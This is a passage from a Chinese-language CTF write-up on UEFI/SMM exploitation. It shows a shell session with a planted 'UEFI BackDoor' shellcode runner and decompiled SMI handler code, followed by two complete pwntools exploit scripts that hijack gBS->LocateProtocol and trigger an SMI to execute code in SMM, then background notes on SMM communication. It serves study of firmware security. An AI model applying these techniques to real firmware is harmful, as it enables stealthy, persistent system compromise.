Alias(s):HD0a65535a1:;BLK1:</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)</span><br><span class="line">     BLK0: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)</span><br><span class="line">     BLK2: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x2,0xFFFF,0x0)</span><br><span class="line">Shell&gt; fs0:</span><br><span class="line">FS0:\&gt; mem</span><br><span class="line">Memory Address 00000000069EE018 78 Bytes</span><br><span class="line">  069EE018: 49 42 49 20 53 59 53 54-46 00 02 00 78 00 00 00  *IBI SYSTF...x...*</span><br><span class="line">  069EE028: F8 83 E2 1D 00 00 00 00-18 D1 9B 06 00 00 00 00  *................*</span><br><span class="line">  069EE038: 00 00 01 00 00 00 00 00-98 DF F6 05 00 00 00 00  *................*</span><br><span class="line">  069EE048: F0 22 F6 05 00 00 00 00-18 68 20 06 00 00 00 00  *.<span class="string">&quot;.......h .....*</span></span><br><span class="line"><span class="string">  069EE058: 20 D1 79 05 00 00 00 00-18 C9 F6 05 00 00 00 00  * .y.............*</span></span><br><span class="line"><span class="string">  069EE068: 90 21 F6 05 00 00 00 00-98 EB 9E 06 00 00 00 00  *.!..............*</span></span><br><span class="line"><span class="string">  069EE078: 80 6B FD 06 00 00 00 00-0A 00 00 00 00 00 00 00  *.k..............*</span></span><br><span class="line"><span class="string">  069EE088: 98 EC 9E 06 00 00 00 00-                         *........*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Valid EFI Header at Address 00000000069EE018</span></span><br><span class="line"><span class="string">---------------------------------------------</span></span><br><span class="line"><span class="string">System: Table Structure size 00000078 revision 00020046</span></span><br><span class="line"><span class="string">ConIn (0000000005F622F0) ConOut (000000000579D120) StdErr (0000000005F62190)</span></span><br><span class="line"><span class="string">Runtime Services 00000000069EEB98</span></span><br><span class="line"><span class="string">Boot Services    0000000006FD6B80</span></span><br><span class="line"><span class="string">SAL System Table 0000000000000000</span></span><br><span class="line"><span class="string">ACPI Table       0000000006B7E000</span></span><br><span class="line"><span class="string">ACPI 2.0 Table   0000000006B7E014</span></span><br><span class="line"><span class="string">MPS Table        0000000000000000</span></span><br><span class="line"><span class="string">SMBIOS Table     00000000069D7000</span></span><br><span class="line"><span class="string">FS0:\&gt; ToyApp</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$  UEFI BackDoor :)   $$</span></span><br><span class="line"><span class="string">$$  Ring 0 priviledge  $$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Type some shellcode with &#x27;DONE&#x27; on a seperate line and press enter to execute.</span></span><br><span class="line"><span class="string">Type &#x27;QUIT&#x27; to quit the program.</span></span><br><span class="line"><span class="string">Your shellcode:</span></span><br></pre></td></tr></table></figure>
<p>熟悉的uefishell任意执行shellcode</p>
<h3 id="TOYSMM"><a href="#TOYSMM" class="headerlink" title="TOYSMM"></a>TOYSMM</h3><p>使用uefitools处理OVMF_CODE.fd</p>
<p>工具打开固件包后,搜索题目的名字关键字<code>Toy</code></p>
<p>将找到的SMM驱动模块dump下来并ida打开</p>
<p>直奔<code>ChildSwSmiHandler</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __fastcall <span class="title function_">ChildSwSmiHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">        EFI_HANDLE DispatchHandle,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">void</span> *Context,</span></span><br><span class="line"><span class="params">        _BYTE *CommBuffer,</span></span><br><span class="line"><span class="params">        UINTN *CommBufferSize)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+4h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CommBuffer || !CommBufferSize )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000000000002</span>ui64;</span><br><span class="line">  v5 = <span class="number">0x41414141</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_2340(CommBuffer + <span class="number">16</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">    gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, <span class="number">0</span>i64, (<span class="type">void</span> **)v6);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v5 != (<span class="type">int</span> *)<span class="number">0x23330000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">      sub_1000();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_2340</code>函数用于匹配内存是否相等</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_2340</span><span class="params">(_BYTE *a1, _BYTE *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = *a1++ == *a2++;</span><br><span class="line">    --a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)*(a1 - <span class="number">1</span>) - (<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)*(a2 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_1000()</code>就直接getflag了</p>
<p>但是无论如何第二个条件是一定不会满足的</p>
<p>即</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, 3i64) )</span><br><span class="line">      sub_1000();</span><br></pre></td></tr></table></figure>
<p>是永远不可能满足的</p>
<p>不过我们可以看到无论如何都是会执行</p>
<p><code>gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, 0i64, (void **)v6);</code>的</p>
<p><strong>而且在DXE态下,我们是具有修改bootservice的权限的</strong>,那岂不是可以直接修改LocateProtocol函数指针为<code>sub_1000()</code>,然后发送SMI即可在<strong>SMM状态</strong>下任意地址执行</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Boot Services    &#x27;</span>)</span><br><span class="line">boot_service = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;BootService @ 0x%x&#x27;</span>, boot_service)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">AllocatePool = <span class="number">0x6fd12f1</span></span><br><span class="line">LocateProtocol = <span class="number">0x6fcc7b4</span></span><br><span class="line">mSmmCommunication = <span class="number">0x6ad9310</span></span><br><span class="line">Communicate = <span class="number">0x6ad6abf</span></span><br><span class="line">Guid = <span class="number">0x9D76F4B1548E0872EC86B7F3B31CF11E</span></span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"><span class="comment">#//backdoor 0x7F06000</span></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;boot_service + <span class="number">320</span>&#125;</span>], 0x7F06000</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x38</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov r8, <span class="subst">&#123;buffer+<span class="number">0x30</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    mov r12, 0x23330000</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;Guid&#125;</span>  /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 0x18                              /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0                                 /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">    .quad 0</span></span><br><span class="line"><span class="string">    .quad 0x41414141</span></span><br><span class="line"><span class="string">    .quad 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>或者直接修改全局变量并使用out触发smi</p>
<p><del>不过还不是很清楚是怎么定位这些全局变量的(<strong>特别是smm_buffer</strong>),反编译去找?,不太懂,所以还是更喜欢第一种方法</del>(已解决)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./run.sh&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">smm_buffer = <span class="number">0x6ad9380</span></span><br><span class="line">guid = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;1EF11CB3F3B786EC72088E54B1F4769D&#x27;</span>)</span><br><span class="line">CommBuffer_offset = <span class="number">56</span></span><br><span class="line">BufferSize_offset = CommBuffer_offset + <span class="number">8</span></span><br><span class="line">ReturnStatus_offset = BufferSize_offset + <span class="number">8</span></span><br><span class="line">bootservice = <span class="number">0x6FD6B80</span></span><br><span class="line">backdoor = <span class="number">0x7F06000</span></span><br><span class="line">payload = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              </span></span><br><span class="line"><span class="string">mov rcx, 0x6FD6B80				/* gBS-&gt;LocateProtocol = PrintFlag */</span></span><br><span class="line"><span class="string">add rcx, 0x140</span></span><br><span class="line"><span class="string">mov rdx, 0x7F06000</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad9400				/* CommBuffer-&gt;HeaderGuid = ToySmmGuid */</span></span><br><span class="line"><span class="string">mov rdx, 0xEC86B7F3B31CF11E</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string">mov rdx, 0x9D76F4B1548E0872</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8						/* CommBuffer-&gt;MessageLength = 4 */</span></span><br><span class="line"><span class="string">mov rdx, 0x4</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 24						/* CommBuffer-&gt;Data[24] = &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="string">mov rdx, 0x41414141</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad93b8				/* mSmmCorePrivateData-&gt;CommunicationBuffer = CommBuffer */</span></span><br><span class="line"><span class="string">mov rdx, 0x6ad9400</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8						/* mSmmCorePrivateData-&gt;BufferSize = 0x1c */</span></span><br><span class="line"><span class="string">mov rdx, 0x1c</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor eax, eax					/* SMI */</span></span><br><span class="line"><span class="string">mov dx, 0xb2</span></span><br><span class="line"><span class="string">mov al, 0x00</span></span><br><span class="line"><span class="string">outb dx, al</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Your shellcode:&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">sl(payload.<span class="built_in">hex</span>())</span><br><span class="line">sl(<span class="string">&quot;DONE&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>我们任意反汇编一个UEFI程序都可以看到其调用约定是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">Microsoft x64</a>，因此参数在RCX、RDX、R8、R9中，然后堆栈。</p>
<h2 id="uefishell"><a href="#uefishell" class="headerlink" title="uefishell"></a>uefishell</h2><p>大多数的uefi类题目,最终提供给我们的交互接口都是一个<a target="_blank" rel="noopener" href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,其允许我们直接输入机器码的十六进制表示,然后去以<code>ring 0</code>的身份去执行</p>
<p>然后出题人自己打上一些patch</p>
<p>最后我们能够直接看到的efi程序,一般就是这个</p>
<p>然后其一般还会能够与一个SMM驱动程序交互</p>
<p>当然其实也不一定,也有菜单类的uefi题目</p>
<h2 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h2><p>UEFI中每一个protocol与服务都会有一个GUID(全局唯一标识符Globally Unique Identifier)</p>
<p>很多交互接口都需要用到guid去寻找对应的protocol</p>
<p>在ida中很容易找到对应的guid</p>
<p>对于一些全局变量来说<strong>,其guid是始终固定的</strong></p>
<p>常见的如下(基于edk2)</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>name</th>
<th>guid</th>
</tr>
</thead>
<tbody>
<tr>
<td>gEfiSmmCommunicationProtocolGuid</td>
<td>0x32c3c5ac65db949d4cbd9dc6c68ed8e2</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
<h2 id="与SMM通信"><a href="#与SMM通信" class="headerlink" title="与SMM通信"></a>与SMM通信</h2><p>一般uefi题目都会有两个关键的文件,分别是</p>
<ol>
<li>前面提到的UEFIshell驱动处理程序,其是一个普通的uefi驱动程序,处于ring 0</li>
<li>以及一个运行在SMM状态下的模块(可能需要从OVMF.fd中提取)</li>
</ol>
<p>我们真正需要关心的其实就是两者之间的交互</p>
<p>对于后者,其在执行时一般都会有运行类似这样一段代码注册一个要执行的处理程序(SMI handler)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure>
<p>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</p>
<p><strong>第二个参数就是指向这个handler的guid的指针</strong>,经常能用上</p>
<p><code>SmiHandlerRegister</code>声明如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiHandlerRegister</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span></span><br><span class="line"><span class="params">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span></span><br><span class="line"><span class="params">  OUT EFI_HANDLE                    *DispatchHandle</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  SMI_HANDLER  *SmiHandler;</span><br><span class="line">  SMI_ENTRY    *SmiEntry;</span><br><span class="line">  LIST_ENTRY   *List;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((Handler == <span class="literal">NULL</span>) || (DispatchHandle == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler = AllocateZeroPool (<span class="keyword">sizeof</span> (SMI_HANDLER));</span><br><span class="line">  <span class="keyword">if</span> (SmiHandler == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;Signature  = SMI_HANDLER_SIGNATURE;</span><br><span class="line">  SmiHandler-&gt;Handler    = Handler;</span><br><span class="line">  SmiHandler-&gt;CallerAddr = (UINTN)RETURN_ADDRESS (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (HandlerType == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This is root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = &amp;mRootSmiEntry;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// None root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, TRUE);</span><br><span class="line">    <span class="keyword">if</span> (SmiEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  List = &amp;SmiEntry-&gt;SmiHandlers;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;SmiEntry = SmiEntry;</span><br><span class="line">  InsertTailList (List, &amp;SmiHandler-&gt;Link);</span><br><span class="line"></span><br><span class="line">  *DispatchHandle = (EFI_HANDLE)SmiHandler;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>对于前者其一般使用<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>协议提供的<code>Communicate()</code>方法与一个smm交流</p>
<p>在递归套娃后<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>其实就是下面这个结构体,其只有一个成员<code>Communicate</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EFI_MM_COMMUNICATION_PROTOCOL</span> &#123;</span></span><br><span class="line">  EFI_MM_COMMUNICATE    Communicate;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>EFI_MM_COMMUNICATE</code>的定义没找着,但根据一些线索,我们能够知道他是一个函数指针</p>
<p>常见的其被初始化为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 